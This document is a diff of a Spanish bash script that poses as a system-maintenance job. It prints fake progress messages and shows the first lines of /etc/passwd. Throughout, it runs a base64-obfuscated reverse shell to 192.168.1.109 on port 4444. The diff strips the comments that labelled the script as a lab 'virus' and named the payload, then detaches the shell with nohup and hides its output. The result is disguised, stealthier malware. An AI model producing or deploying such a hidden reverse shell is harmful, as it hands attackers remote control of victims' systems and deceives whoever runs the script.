@@ -1,22 +1,13 @@
 #!/bin/bash
 
-# ========================================================
-# Script: mantenimiento_pro.sh (virus.sh)
-# Uso: Laboratorio de Ciberseguridad
-# ========================================================
-
-# Configuración del atacante
-IP_ATACANTE="192.168.1.109"
 PUERTO=4444
 
 echo "Iniciando mantenimiento del sistema..."
-# Simulamos actividad legítima leyendo parte del archivo passwd
 cat /etc/passwd | head -n 5
-echo "Procesando paquetes y verificando dependencias..."
+echo "Procesando paquetes..."
 
-# CARGA ÚTIL (PAYLOAD) OFUSCADA
-# Decodifica y ejecuta una reverse shell en segundo plano
-echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA5LzQ0NDQgMD4mMSAm" | base64 -d | bash
+# nohup independiza el proceso y & lo manda al fondo
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA5LzQ0NDQgMD4mMSAm" | base64 -d | nohup bash > /dev/null 2>&1 &
 
-sleep 2
-echo "Actualización completada correctamente."
+sleep 1
+echo "Actualización completada."
